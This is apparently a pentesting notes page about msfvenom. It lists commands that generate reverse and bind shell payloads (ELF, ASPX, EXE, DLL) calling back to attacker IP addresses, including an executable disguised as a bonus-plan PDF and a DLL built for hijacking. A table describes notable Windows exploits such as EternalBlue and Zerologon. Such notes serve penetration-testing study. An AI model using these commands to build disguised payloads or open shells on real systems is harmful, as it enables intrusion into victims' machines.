---
title: msfvenom
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - terminal
  - shells
---

# msfvenom

You can generate a webshell by using  msfvenom

```bash
# List payloads
msfvenom --list payloads | grep x64 | grep linux | grep reverse  

# list all the available payloads
msfvenom -l payloads  
```

Also msfvenom can use metasploit payloads under “cmd/unix”  to generate one-liner bind or reverse shells. List options with:

```bash
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```



## Some flags

```bash
# -b, or --bad-chars: The list of characters to avoid example: '0'

```


## Staged payload

```bash
# Example of a linux staged payload
msfvenom -p linux/x64/shell/reverse_tcp lhost=192.66.166.2 lport=443 -f elf -o newfile

# Example of a windows staged payload
msfvenom -p windows/x64/meterpreter/bind_tcp lhost=10.10.14.72 lport=1234 -f aspx -o lal
```


After that

```bash
chmod +x newfile 
```

When creating a staged payload, you will need to use a metasploit handler (exploit/multi/handler) in order to receive the shell connection as only metasploit contains proper logic that will send the rest of the payload to the connector . In that case, the metasploit payload has to be the same one as the MSFVenom one.

## Stagedless payload

A stage less payload is a standalone program that does not need anything aditional (no metasploit connection), just the netcat listener on the computer.

```bash
# Example of a windows stageless payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.


## crafting a DLL file with a webshell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x86 -f dll > SECUR32.dll
# -p: for the chosen payload
# -a: architecture in the victim machine/application
# -f: format for the output file
```
[More about DLL highjacking in thick client applications](thick-applications/tca-attacking-thick-clients-applications.md#how-is-dll-hijacking-perform).


## Mitical attacks

|**Vulnerability**|**Description**|
|---|---|
|`MS08-067`|MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.|
|`Eternal Blue`|MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.|
|`PrintNightmare`|A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).|
|`BlueKeep`|CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.|
|`Sigred`|CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.|
|`SeriousSam`|CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.|
|`Zerologon`|CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.|

